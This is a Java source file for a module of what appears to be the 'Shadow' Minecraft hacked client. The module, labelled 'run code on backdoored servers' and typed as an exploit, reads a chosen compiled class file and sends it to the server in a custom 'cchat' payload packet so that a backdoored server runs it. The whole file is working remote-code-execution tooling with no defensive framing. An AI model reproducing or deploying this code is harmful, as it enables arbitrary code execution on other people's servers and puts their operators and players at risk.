package net.shadow.feature.module;

import io.netty.buffer.Unpooled;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.CustomValue;
import net.shadow.plugin.Notification;
import net.shadow.plugin.NotificationSystem;
import org.apache.commons.io.FileUtils;

import java.io.File;

public class RCEModule extends Module {
    final CustomValue<String> file = this.config.create("File", "file.class");

    public RCEModule() {
        super("RCExecutor", "run code on backdoored servers", ModuleType.EXPLOIT);
    }

    @Override
    public void onEnable() {
        try {
            File f = new File(Shadow.c.runDirectory.getAbsolutePath() + "/shadow/classes/" + file.getThis());
            if (!f.canRead()) {
                NotificationSystem.notifications.add(new Notification("CodeExecutor", "Couldnt read the file", 150));
                return;
            }
            byte[] classFile = FileUtils.readFileToByteArray(f);
            PacketByteBuf payload = new PacketByteBuf(Unpooled.buffer());
            String name = "amogus";
            byte[] nameEncoded = new byte[name.length()];
            for (int i = 0; i < name.toCharArray().length; i++) {
                char c = name.toCharArray()[i];
                nameEncoded[i] = (byte) c;
            }
            payload.writeBytes(nameEncoded);
            payload.writeByte(0x0);
            payload.writeBytes(classFile);
            Shadow.c.getNetworkHandler().sendPacket(new CustomPayloadC2SPacket(new Identifier("cchat"), payload));
            NotificationSystem.notifications.add(new Notification("CodeExecutor", "Send Payload", 150));
        } catch (Exception e) {
            NotificationSystem.notifications.add(new Notification("CodeExecutor", "Failed To send Payload", 150));
            e.printStackTrace();
        }
        this.setEnabled(false);
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {

    }

    @Override
    public void onRender() {

    }
}
